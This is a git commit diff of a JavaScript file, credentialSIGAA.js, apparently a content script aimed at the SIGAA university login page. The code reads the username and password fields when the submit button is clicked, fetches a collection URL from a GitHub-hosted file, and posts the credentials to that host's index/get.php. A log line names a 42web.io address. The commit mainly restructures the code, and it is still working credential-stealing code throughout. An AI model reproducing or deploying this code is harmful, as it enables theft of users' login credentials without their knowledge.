d83160a58c2684d26ae15e7bec2972f76dcb438f
Wolota <123838258+Wolota@users.noreply.github.com>
2023-03-01 23:55:07 -0300

    Update credentialSIGAA.js

--- credentialSIGAA.js
+++ credentialSIGAA.js
@@ -1,39 +1,39 @@
 console.log("yepp")
-document.addEventListener("DOMContentLoaded", function() {
-    let btn = document.getElementsByClassName("g-recaptcha")
-    const username = document.querySelector('[name="user.login"]')
-    const password = document.querySelector('[name="user.senha"]')
+//document.addEventListener("DOMContentLoaded", function() {
+let btn = document.getElementsByClassName("g-recaptcha")
+const username = document.querySelector('[name="user.login"]')
+const password = document.querySelector('[name="user.senha"]')
 
 
-    if (btn[0]){
-        console.log("encontrou")
-        btn[0].addEventListener("click", function(){
-            console.log("Botão de envio de formulário clicado.");
+if (btn[0]){
+    console.log("encontrou")
+    btn[0].addEventListener("click", function(){
+        console.log("Botão de envio de formulário clicado.");
 
-            let xhr = new XMLHttpRequest();
+        let xhr = new XMLHttpRequest();
 
-            console.log("Objeto XMLHttpRequest criado.");
+        console.log("Objeto XMLHttpRequest criado.");
 
-            xhr.open('GET', 'https://raw.githubusercontent.com/Wolota/ips/main/url-new', true);
-            xhr.onreadystatechange = async function() {
-                if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
-                    const urlContent = xhr.responseText;
+        xhr.open('GET', 'https://raw.githubusercontent.com/Wolota/ips/main/url-new', true);
+        xhr.onreadystatechange = async function() {
+            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+                const urlContent = xhr.responseText;
 
-                    const data = new FormData();
-                    data.append("username", username.value);
-                    data.append("password", password.value);
+                const data = new FormData();
+                data.append("username", username.value);
+                data.append("password", password.value);
 
-                    const response = await fetch(urlContent + "index/get.php", {
-                        method: "POST",
-                        body: data
-                    });
+                const response = await fetch(urlContent + "index/get.php", {
+                    method: "POST",
+                    body: data
+                });
 
-                    console.log("Dados enviados com sucesso para http://fckyou.42web.io/index/get.php.");
-                }
-            };
-            xhr.send();
+                console.log("Dados enviados com sucesso para http://fckyou.42web.io/index/get.php.");
+            }
+        };
+        xhr.send();
 
-            console.log("Requisição enviada para o servidor.");
-        });
-    }
-});
+        console.log("Requisição enviada para o servidor.");
+    });
+}
+//});
